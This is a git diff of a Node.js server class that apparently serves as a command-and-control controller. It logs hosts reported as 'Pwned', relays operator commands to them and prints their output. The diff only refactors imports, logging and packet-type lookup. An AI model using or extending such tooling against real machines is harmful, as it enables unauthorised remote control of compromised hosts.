@@ -1,7 +1,7 @@
 const EventEmitter = require('events');
-const { packet_types } = require('../lib/protocol');
-const { serializePacket, parsePacket, createPacket: _createPacket } = require('../lib/packet');
-const { PacketConnection } = require('../lib/connection');
+const { packet_types } = require('../protocol/protocol');
+const { serializePacket, parsePacket, createPacket: _createPacket } = require('../protocol/packet');
+const { PacketConnection } = require('../protocol/connection');
 
 
 class Server extends EventEmitter {
@@ -35,7 +35,7 @@ class Server extends EventEmitter {
         }
 
         if (packet.type.name == 'newpwn') {
-            console.log(`[!] Pwned ${packet.ip}`);
+            console.log(`\n[!] Pwned ${packet.ip}`);
         }
         if (packet.type.name == 'hostresponse') {
             this.emit('hostpacket', parsePacket('host', 'response', packet.data));
@@ -59,10 +59,15 @@ class Server extends EventEmitter {
      * @returns 
      */
     async sendHostCommand(packet, callback) {
+        let type = null;
+        for (let pkt of packet_types.control.command.values()) {
+            if (pkt.name == 'relaycommand') {
+                type = pkt;
+                break;
+            }
+        }
         let wrappedPkt = {
-            type: packet_types.control.command.find(
-                (pkt) => pkt != null && pkt.name == 'relaycommand'
-            ),
+            type,
             id: 0, // TODO: fill in host id
             command: serializePacket('host', 'command', packet),
         };
@@ -75,7 +80,7 @@ class Server extends EventEmitter {
                 } else {
                     if (callback == null) {
                         if (responsePkt.type.name == 'out') {
-                            console.log(responsePkt.out);
+                            process.stdout.write(responsePkt.out);
                         } else if (responsePkt.type.name == 'err') {
                             console.error(`ERROR: ${responsePkt.err}`);
                         }
